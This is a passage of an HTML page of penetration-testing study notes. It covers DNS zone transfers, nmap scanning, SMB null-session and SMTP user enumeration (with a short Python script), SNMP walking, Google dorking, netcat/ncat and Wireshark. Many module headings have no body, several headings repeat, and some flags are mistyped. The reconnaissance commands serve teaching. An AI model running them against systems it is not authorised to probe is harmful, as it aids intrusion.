+<li><strong>MX records</strong> – Mail servers.</li>
+<li><strong>NS records</strong> – Nameservers.</li>
+<li><strong>TXT records</strong> – Often used for SPF, DKIM, and verification.</li>
+<li><strong>CNAME records</strong> – Aliases for domains.</li>
+<li><strong>Subdomains</strong> – Can reveal internal or staging services.</li>
+<li><strong>Zone transfers</strong> – Misconfigured DNS servers can leak entire domain structures.</li>
+</ul>
+<p><code>host -t ns &lt;domain-name&gt;</code></p>
+<p><code>host -t mx &lt;domain-name&gt;</code></p>
+<p><code>host &lt;domain-name&gt;</code></p>
+<h3 id="forward-dns-lookup">FORWARD DNS LOOKUP</h3>
+<p>A DNS forward lookup is <strong>the process of translating a human-readable domain name (like <a href="http://example.com">example.com</a>) into a computer-readable IP address</strong></p>
+<p>We can also create the batch script for DNS Lookup.</p>
+<h3 id="reverse-dns-lookup">REVERSE DNS LOOKUP</h3>
+<p>Reverse DNS lookup (rDNS) is <strong>a process in computer networks where you determine the domain name associated with a given IP address</strong></p>
+<h3 id="zone-transfers">ZONE TRANSFERS</h3>
+<p>A <strong>DNS zone transfer</strong> (AXFR) is a mechanism designed to replicate DNS databases across DNS servers. In normal use, it's meant for secondary DNS servers to stay synchronized with a primary server. However, <strong>if misconfigured</strong>, it can be exploited during <strong>reconnaissance</strong> to <strong>leak a full list of hosts and subdomains</strong> for a target domain.</p>
+<p><code>host -t ns &lt;dns-server-domain-name&gt; host -l &lt;dns-server-domain-name&gt;</code></p>
+<p>we can use the script to try to zone transfer</p>
+<h2 id="port-scanning">PORT SCANNING</h2>
+<h3 id="connect-scan">CONNECT SCAN</h3>
+<h3 id="connect-scan_1">🔌 CONNECT SCAN</h3>
+<ul>
+<li><strong>Also Known As:</strong> TCP Connect Scan.</li>
+<li>Uses full TCP handshake (SYN, SYN-ACK, ACK).</li>
+<li>Most accurate but also most <strong>noisy</strong> (easily detectable by firewalls/IDS).</li>
+<li>Used when user does not have raw packet privileges (e.g., on Windows).</li>
+</ul>
+<h3 id="syn-scan">SYN SCAN</h3>
+<h3 id="syn-scan_1">⚡ SYN SCAN</h3>
+<ul>
+<li><strong>Half-open scan</strong> using only the SYN and SYN-ACK.</li>
+<li>Fast and stealthy, as it doesn’t complete the TCP handshake.</li>
+<li>Most common scan used with <code>nmap -sS</code>.</li>
+</ul>
+<h3 id="udp-scan">UDP SCAN</h3>
+<h3 id="udp-scan_1">🌊 UDP SCAN</h3>
+<ul>
+<li>Scans for open <strong>UDP ports</strong> (e.g., DNS on 53, SNMP on 161).</li>
+<li>Slower than TCP scans due to lack of handshake and ICMP error responses.</li>
+<li>Used with <code>nmap -sU</code>.</li>
+</ul>
+<h2 id="network-implications">NETWORK IMPLICATIONS</h2>
+<ul>
+<li>Port scanning can trigger <strong>Intrusion Detection Systems (IDS)</strong>.</li>
+<li>Excessive scans may lead to <strong>IP blocking or blacklisting</strong>.</li>
+<li>Could impact network performance (especially UDP scans).</li>
+<li>Legal implications: Always get permission before scanning.</li>
+</ul>
+<h2 id="nmap">NMAP</h2>
+<p>The most widely used network scanning tool.</p>
+<h3 id="traffic-accountability">📈 TRAFFIC ACCOUNTABILITY</h3>
+<ul>
+<li>Logging of scan results and tracking scan types per host.</li>
+<li>Use <code>oA</code> flag to output in multiple formats (XML, grepable, normal).</li>
+</ul>
+<h3 id="traffic-accountability_1">TRAFFIC ACCOUNTABILITY</h3>
+<h3 id="traffic-accountability_2">TRAFFIC ACCOUNTABILITY</h3>
+<ul>
+<li>Logging of scan results and tracking scan types per host.</li>
+<li>Use <code>oA</code> flag to output in multiple formats (XML, grepable, normal).</li>
+</ul>
+<h3 id="network-sweeping">NETWORK SWEEPING</h3>
+<h3 id="network-sweeping_1">🧹 NETWORK SWEEPING</h3>
+<ul>
+<li>Detecting live hosts using:<ul>
+<li><strong>Ping sweeps</strong>: <code>nmap -sn</code></li>
+<li><strong>ARP scans</strong>: <code>nmap -PR</code> (for local network)</li>
+</ul>
+</li>
+</ul>
+<h3 id="os-discovery">OS DISCOVERY</h3>
+<h3 id="os-discovery_1">OS DISCOVERY</h3>
+<ul>
+<li>Uses TCP/IP fingerprinting to detect target OS.</li>
+<li>Run with <code>nmap -O</code> or <code>-osscan-guess</code>.</li>
+</ul>
+<h3 id="nse-scripts">NSE SCRIPTS</h3>
+<h3 id="nse-scripts_1">NSE SCRIPTS</h3>
+<ul>
+<li><strong>Nmap Scripting Engine</strong> extends Nmap with custom scripts.</li>
+<li>Categories:<ul>
+<li><code>auth</code>, <code>default</code>, <code>discovery</code>, <code>vuln</code>, etc.</li>
+</ul>
+</li>
+<li>Example: <code>nmap --script smb-os-discovery -p445 &lt;target&gt;</code></li>
+</ul>
+<h2 id="smb-enumeration">SMB ENUMERATION</h2>
+<h3 id="smb-null-sessions">SMB NULL SESSIONS</h3>
+<p>Allows unauthenticated users to access SMB info.</p>
+<ul>
+<li>Use <code>rpcclient -U "" &lt;IP&gt;</code> or tools like <code>enum4linux</code>.</li>
+</ul>
+<h3 id="enum4linux">ENUM4LINUX</h3>
+<p>Perl script for SMB/NetBIOS enumeration on Linux.</p>
+<ul>
+<li>Gathers:<ul>
+<li>Users, Groups, Shares, OS info, password policies, etc.</li>
+</ul>
+</li>
+<li>Usage: <code>enum4linux &lt;IP&gt;</code></li>
+</ul>
+<h3 id="smb-nse-scripts">SMB NSE SCRIPTS</h3>
+<p>Nmap has specific scripts for SMB enumeration:</p>
+<ul>
+<li><code>smb-enum-shares</code></li>
+<li><code>smb-enum-users</code></li>
+<li><code>smb-os-discovery</code></li>
+<li><code>smb-vuln-ms17-010</code></li>
+</ul>
+<h2 id="smtp-enumeration">SMTP ENUMERATION</h2>
+<h3 id="vrfy-script">VRFY SCRIPT</h3>
+<p>SMTP <code>VRFY</code> command checks if a username is valid.</p>
+<ul>
+<li>Syntax: <code>VRFY user@example.com</code></li>
+<li>Can be tested using <code>telnet</code>, <code>nmap</code>, or Python scripts.</li>
+</ul>
+<h3 id="python-port">PYTHON PORT</h3>
+<ul>
+<li>Python scripts can automate SMTP user enumeration.</li>
+<li>Example:</li>
+</ul>
+<pre><code>import smtplib
+server = smtplib.SMTP('mail.example.com', 25)
+server.ehlo()
+server.mail('test@example.com')
+code, message = server.rcpt('admin@example.com')
+if code == 250:
+    print(&quot;User exists&quot;)
+
+</code></pre>
+<h2 id="snmp-enumeration">SNMP ENUMERATION</h2>
+<h3 id="snmp-mib">SNMP MIB</h3>
+<ul>
+<li><strong>Management Information Base (MIB)</strong>: database of objects SNMP can manage.</li>
+<li>Helps interpret SNMP data (like sysName, sysDescr).</li>
+</ul>
+<h3 id="snmpwalk">SNMPWALK</h3>
+<ul>
+<li>Command-line tool to query SNMP devices.</li>
+<li>Example: <code>snmpwalk -v2c -c public &lt;IP&gt;</code></li>
+<li>Can retrieve:<ul>
+<li>System info, routing tables, interfaces, etc.</li>
+</ul>
+</li>
+</ul>
+<hr />
+<h1 id="module-5-vulnerability-scanning"><strong>MODULE 5 - VULNERABILITY SCANNING</strong></h1>
+<h2 id="more-nse-scripts">MORE NSE SCRIPTS</h2>
+<h2 id="openvas">OPENVAS</h2>
+<hr />
+<h1 id="module-6-intro-to-overflows"><strong>MODULE 6 - INTRO TO OVERFLOWS</strong></h1>
+<h2 id="vulnerable-code">VULNERABLE CODE</h2>
+<h2 id="stack-overflow">STACK OVERFLOW</h2>
+<hr />
+<h1 id="module-7-windows-buffer-overflow-example"><strong>MODULE 7 - WINDOWS BUFFER OVERFLOW EXAMPLE</strong></h1>
+<h2 id="fuzzing">FUZZING</h2>
+<h2 id="crash-replication">CRASH REPLICATION</h2>
+<h2 id="controlling-eip">CONTROLLING EIP</h2>
+<h2 id="introducing-shellcode">INTRODUCING SHELLCODE</h2>
+<h2 id="bad-characters">BAD CHARACTERS</h2>
+<h2 id="redirecting-execution">REDIRECTING EXECUTION</h2>
+<h2 id="introducing-mona">INTRODUCING MONA</h2>
+<h2 id="shellcode-payload">SHELLCODE PAYLOAD</h2>
+<hr />
+<h1 id="module-8-linux-buffer-overflow-example"><strong>MODULE 8 - LINUX BUFFER OVERFLOW EXAMPLE</strong></h1>
+<h2 id="controlling-eip_1">CONTROLLING EIP</h2>
+<h2 id="locating-space">LOCATING SPACE</h2>
+<h2 id="first-stage-shellcode">FIRST STAGE SHELLCODE</h2>
+<h2 id="locating-ret">LOCATING RET</h2>
+<h2 id="generating-shellcode">GENERATING SHELLCODE</h2>
+<hr />
+<h1 id="module-9-using-public-exploits"><strong>MODULE 9 - USING PUBLIC EXPLOITS</strong></h1>
+<h2 id="finding-exploits">FINDING EXPLOITS</h2>
+<h2 id="exploit-db">EXPLOIT-DB</h2>
+<h2 id="fixing-exploits-1">FIXING EXPLOITS #1</h2>
+<h2 id="fixing-exploits-2">FIXING EXPLOITS #2</h2>
+<h2 id="cross-compiling">CROSS COMPILING</h2>
+<hr />
+<h1 id="module-10-file-transfers"><strong>MODULE 10 - FILE TRANSFERS</strong></h1>
+<h2 id="tftp-transfers">TFTP TRANSFERS</h2>
+<h2 id="ftp-transfers">FTP TRANSFERS</h2>
+<h2 id="vbscript-transfers">VBSCRIPT TRANSFERS</h2>
+<h2 id="powershell-transfers">POWERSHELL TRANSFERS</h2>
+<hr />
+<h1 id="module-11-privilege-escalation"><strong>MODULE 11 - PRIVILEGE ESCALATION</strong></h1>
+<h2 id="linux-root">LINUX ROOT</h2>
+<h2 id="windows-system">WINDOWS SYSTEM</h2>
+<h2 id="windows-weak-services">WINDOWS WEAK SERVICES</h2>
+<h2 id="linux-weak-services">LINUX WEAK SERVICES</h2>
+<hr />
+<h1 id="module-12-client-side-attacks"><strong>MODULE 12 - CLIENT SIDE ATTACKS</strong></h1>
+<h2 id="replacing-shellcode">REPLACING SHELLCODE</h2>
+<h2 id="java-applets">JAVA APPLETS</h2>
+<hr />
+<h1 id="module-13-web-application-attacks"><strong>MODULE 13 - WEB APPLICATION ATTACKS</strong></h1>
+<h2 id="local-file-inclusion-sql">LOCAL FILE INCLUSION SQL</h2>
+<h2 id="injection-truncated-in-source">INJECTION <em>(TRUNCATED IN SOURCE)</em></h2>
+<p>PASSIVE INFORMATION GATHERING</p>
+<p><strong>Passive information gathering</strong> involves collecting data about a target <strong>without directly interacting</strong> with its systems. This method is stealthy and minimizes the risk of detection, making it a preferred starting point for many ethical hackers.</p>
+<p>Google Search/Dork:</p>
+<p><strong>Google Dorking</strong>, also known as <strong>Google hacking</strong>, is a technique that uses advanced Google search operators to find specific information that's not easily accessible through a basic search.</p>
+<table>
+<thead>
+<tr>
+<th><strong>Operator</strong></th>
+<th><strong>Description</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>site:</code></td>
+<td>Search within a specific website or domain. <em>Example: <code>site:example.com</code></em></td>
+</tr>
+<tr>
+<td><code>filetype:</code></td>
+<td>Search for specific file types. <em>Example: <code>filetype:pdf</code></em></td>
+</tr>
+<tr>
+<td><code>intitle:</code></td>
+<td>Find pages with certain keywords in the title. <em>Example: <code>intitle:"index of"</code></em></td>
+</tr>
+<tr>
+<td><code>inurl:</code></td>
+<td>Find pages with specific text in the URL. <em>Example: <code>inurl:admin</code></em></td>
+</tr>
+<tr>
+<td><code>intext:</code></td>
+<td>Search for text within a page’s content. <em>Example: <code>intext:"confidential"</code></em></td>
+</tr>
+<tr>
+<td><code>cache:</code></td>
+<td>View Google’s cached version of a page.</td>
+</tr>
+<tr>
+<td><code>allintext:</code></td>
+<td>Like <code>intext:</code>, but searches for all specified terms in the page.</td>
+</tr>
+<tr>
+<td><code>allintitle:</code></td>
+<td>Like <code>intitle:</code>, but all terms must appear in the title.</td>
+</tr>
+</tbody>
+</table>
+<p>Google Hacking Database (GHDB):</p>
+<h1 id="essential-tools">Essential Tools</h1>
+<h2 id="netcat-ncat">NETCAT &amp; NCAT</h2>
+<p><strong>Netcat</strong> and <strong>Ncat</strong> are both powerful networking utilities used for reading from and writing to network connections via TCP or UDP, but they have some key differences in features, syntax, and use cases.</p>
+<hr />
+<h3 id="netcat-nc">🛠️ Netcat (nc)</h3>
+<h3 id="overview">🔹 Overview:</h3>
+<ul>
+<li>Often referred to as the <em>"Swiss Army knife of networking."</em></li>
+<li>Very lightweight and widely available.</li>
+<li>Comes in different versions (OpenBSD, GNU, traditional).</li>
+</ul>
+<h3 id="features">🔹 Features:</h3>
+<ul>
+<li>Connect to or listen on TCP/UDP ports</li>
+<li>File transfer</li>
+<li>Simple chat server</li>
+<li>Port scanning (basic)</li>
+<li>Bind shell/reverse shell</li>
+</ul>
+<h3 id="example-usage">🔹 Example Usage:</h3>
+<pre><code class="language-bash"># Listen on port 1234
+nc -l -p 1234
+
+# Connect to a host
+nc 192.168.1.10 1234
+
+</code></pre>
+<hr />
+<h3 id="ncat_1">🛠️ Ncat</h3>
+<h3 id="overview_1">🔹 Overview:</h3>
+<ul>
+<li>A modern reimplementation of Netcat, developed by the <strong>Nmap</strong> project.</li>
+<li>More secure and feature-rich.</li>
+<li>Cross-platform (Linux and Windows).</li>
+</ul>
+<h3 id="enhanced-features">🔹 Enhanced Features:</h3>
+<ul>
+<li>SSL/TLS support</li>
+<li>Connection brokering (proxy via Ncat relay)</li>
+<li>Input/output redirection</li>
+<li>IPv6 support</li>
+<li>Connection logging</li>
+<li>Authentication</li>
+</ul>
+<h3 id="example-usage_1">🔹 Example Usage:</h3>
+<pre><code class="language-bash"># Listen with SSL
+ncat --ssl -l 1234
+
+# Connect using SSL
+ncat --ssl target.com 1234
+
+</code></pre>
+<hr />
+<h3 id="key-differences">🔍 Key Differences:</h3>
+<table>
+<thead>
+<tr>
+<th>Feature</th>
+<th>Netcat (nc)</th>
+<th>Ncat</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>SSL/TLS Support</td>
+<td>❌ No</td>
+<td>✅ Yes</td>
+</tr>
+<tr>
+<td>Cross-platform</td>
+<td>❌ Limited</td>
+<td>✅ Yes</td>
+</tr>
+<tr>
+<td>Maintained</td>
+<td>⚠️ Some forks</td>
+<td>✅ Actively (by Nmap)</td>
+</tr>
+<tr>
+<td>Input/output control</td>
+<td>⚠️ Basic</td>
+<td>✅ Advanced</td>
+</tr>
+<tr>
+<td>Authentication</td>
+<td>❌ No</td>
+<td>✅ Yes</td>
+</tr>
+<tr>
+<td>Relay/proxy mode</td>
+<td>❌ No</td>
+<td>✅ Yes</td>
+</tr>
+</tbody>
+</table>
+<h2 id="wireshark_1">Wireshark</h2>
+<p><strong>Wireshark</strong> is a <strong>free and open-source network protocol analyzer</strong> used for capturing and inspecting data traffic on a computer network in real time. It’s one of the most powerful tools for <strong>network troubleshooting</strong>, <strong>protocol analysis</strong>, <strong>penetration testing</strong>, and <strong>digital forensics</strong>.</p>
+<hr />
+<h3 id="key-features-of-wireshark">🔍 Key Features of Wireshark:</h3>
+<ul>
+<li><strong>Live packet capture</strong> from network interfaces (Ethernet, Wi-Fi, etc.)</li>
+<li><strong>Deep inspection</strong> of hundreds of protocols (TCP, UDP, HTTP, DNS, etc.)</li>
+<li><strong>Color-coded filtering</strong> and highlighting for easy analysis</li>
+<li><strong>Packet reassembly</strong> for protocols like TCP</li>
+<li><strong>Exporting data</strong> for offline analysis (e.g., <code>.pcap</code> files)</li>
+<li><strong>Display filters</strong> for fine-grained inspection of traffic</li>
+<li><strong>Decryption support</strong> for many protocols (e.g., SSL/TLS if keys are available)</li>
+</ul>
+<hr />
+<h3 id="common-use-cases">🛠️ Common Use Cases:</h3>
+<table>
+<thead>
+<tr>
+<th>Use Case</th>
+<th>Example</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Network troubleshooting</td>
+<td>Identify packet loss or latency issues</td>
+</tr>
+<tr>
+<td>Security analysis</td>
+<td>Detect suspicious packets or attacks</td>
+</tr>
+<tr>
+<td>Protocol development/testing</td>
+<td>Debug and verify custom protocols</td>
+</tr>
+<tr>
+<td>Malware analysis</td>
+<td>Inspect C2 traffic or exfiltration</td>
+</tr>
+<tr>
+<td>Educational purposes</td>
+<td>Learn how protocols like TCP/IP work</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h3 id="basic-workflow">🔧 Basic Workflow:</h3>
+<ol>
+<li><strong>Start Capture</strong> on a network interface.</li>
+<li><strong>Apply Filters</strong> to narrow down the traffic (e.g., <code>http</code>, <code>ip.addr == 192.168.1.1</code>).</li>
+<li><strong>Inspect Packets</strong>: View headers, payloads, and protocol details.</li>
+<li><strong>Save or Export</strong> the capture for future analysis.</li>
+</ol>
+<hr />
+<h3 id="example-filters">📦 Example Filters:</h3>
+<ul>
+<li><code>ip.addr == 192.168.1.10</code> → Show traffic to/from that IP</li>
+<li><code>tcp.port == 80</code> → Show HTTP traffic</li>
+<li><code>http.request</code> → Show HTTP requests only</li>
+<li><code>dns</code> → Show DNS queries/responses</li>
+</ul>
+<hr />
+<h3 id="note">📌 Note:</h3>
+<ul>
+<li><strong>Wireshark requires root/admin privileges</strong> to capture on some systems.</li>
+<li>It can capture <strong>sensitive information</strong> (e.g., passwords in plain text protocols), so use it responsibly and legally.</li>
+</ul>
+<p>Would you like a sample <code>.pcap</code> file walkthrough or an example of using Wireshark for packet sniffing?</p>
+<p><a href="https://app.notion.com/p/25226fbde15080f884cec09bbff88a26?pvs=21"></a></p>
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+  
+
+
+
+      
+    </article>
+  </div>
+
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+      </main>
+      
+<footer class="hitop-footer">
+  <div class="hitop-footer__inner">
+
+    <div class="hitop-footer__brand">
+      <a class="hitop-footer__logo"
+         href="../../../..">
+        HITOP
+      </a>
+      <p>
+        Your knowledge hub for standard operating procedures,
+        documentation and troubleshooting.
+      </p>
+    </div>
+
+    <div class="hitop-footer__links">
+      <h3>Quick Links</h3>
+      <a href="../../../../about/">About Us</a>
+      <a href="../../../../category/how-to-guide/">How to Guide</a>
+      <a href="../../../../category/tutorials/">Tutorials</a>
+      <a href="../../../../category/sops/">SOPs</a>
+      <a href="../../../../category/troubleshooting/">Troubleshooting</a>
+      <a href="../../../../support/">Get Support</a>
+    </div>
+
+  </div>
+
+  <div class="hitop-footer__bottom">
+    <p>© 2026 HITOP. All rights reserved.</p>
+    <p>Built for better documentation and knowledge sharing.</p>
+  </div>
+</footer>
+
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../../../..", "features": [], "search": "../../../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../../../assets/javascripts/bundle.d7400e89.min.js"></script>
+      
+    
+  </body>
+</html>
